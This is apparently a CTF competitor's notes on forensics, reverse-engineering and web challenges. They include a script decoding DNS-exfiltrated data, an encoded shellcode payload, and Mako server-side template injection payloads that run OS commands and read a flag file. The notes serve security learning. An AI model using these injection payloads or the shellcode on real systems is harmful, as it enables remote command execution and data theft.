# Forensics
Again there is a pcap file. It looks like a subdomain fuzzing attempt. Calling strings did not yield any useful information at first glance.

Next: look into how to read through and understand DNS packets.

packet 473 and 474 had a WD in front of them, which no other packets had:
465/66 = HD
--> it appears most packets have a character or something related to them.

They are DNS A type records, which are the most basic apparently.

Analysing the queries, it appears there are several xml files (workbooks and drawings) being transferred:
```
import re
import binascii

with open('names.txt', 'r') as f:
    for name in f:
        #print('name: ', name)
        m = re.findall('([a-z0-9\.]+)\.pumpkincorp.com', name)
        if m:
            #print('m: ',m)
            print(binascii.unhexlify(m[0].replace('.', '')))
```


HTB{M4g1c_c4nn0t_pr3v3nt_d4t4_br34ch}
# Rev
There is an encoded payload:
```
[SYIIIIIIIIICCCCCCC7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI01iKzWHcScW3F3Pj6bOyHax0cVZmK0MCpYh0WO8Mk0PIbYYibHsOS0wp7qqxUReP5UfYmYhaLpCVV0PQF3LsfcOyIqZmMPF2ax0ndo1cE8e8fOvORBCYMYHcF2PSOyHaNPFkJmopRJ4KChmI3bU6e8Tme3ni8gCXFO2S1xC0U8VOsR59RNK9KSaByx4ZS0EPUPauPcphrOq0bh0Tg2cK2p0LSJso1ct43B51e31uSormFSGCTsSMgpV7rsLI9qJmmPAA
```
Not entirely sure how to decode it, but exiftool said its an _application/octet-stream_ and an _elf_ binary. 
The square bracket at the beginning caught my eye - this must be identifiable for an encoding of sorts.

Next: look for typical encodings for elf binaries + look into octet-stream encoding!
(apparently its agile?)

Looking into the file with rizin, it appears there are some XOR calculations happening, and the string:
`A0WO8aLpCrOq075mI3b9051` was commented out throughout the code in sections
![[Screenshot 2022-10-25 at 12.00.01.png]]
![[Screenshot 2022-10-23 at 19.57.49.png]]

# Web
It looks like some special characters are filtered, except for `/.     "| ' {}  +  -)(*   $   `
--> possible indirect xss filtering. Its got to do with the fonts I think.

Flask mako is used, and it is apparently similar to jinja:
```
Rendering Mako templates sends the same template_rendered signal as Jinja2 templates. Additionally, Mako templates receive the same context as Jinja2 templates. This allows you to use the same variables as you normally would (g, session, url_for, etc)
```
Looking in the code of _util.py_ this is confirmed:
```
$, (, ), {, }, ., \, ", /, -, |, *, +

```

`${{4*4}}` gave 16 as an output --> we have SSTI:)

`${self.module.cache.util.os.system("id")}` --> returned -, so we know it works. Thanks to [PATT](https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Server%20Side%20Template%20Injection/#direct-access-to-os-from-templatenamespace) as per. However, from experience the `os.system()` will not work as the challenges tend to be local. Therefore, `os.popen().read()` is the way to go and it usually works:
Winner command: `${self.module.cache.util.os.popen("cat ../flag.txt").read()}`:
![[HTB_web2_flag.png]]


# pwn


# Crypto

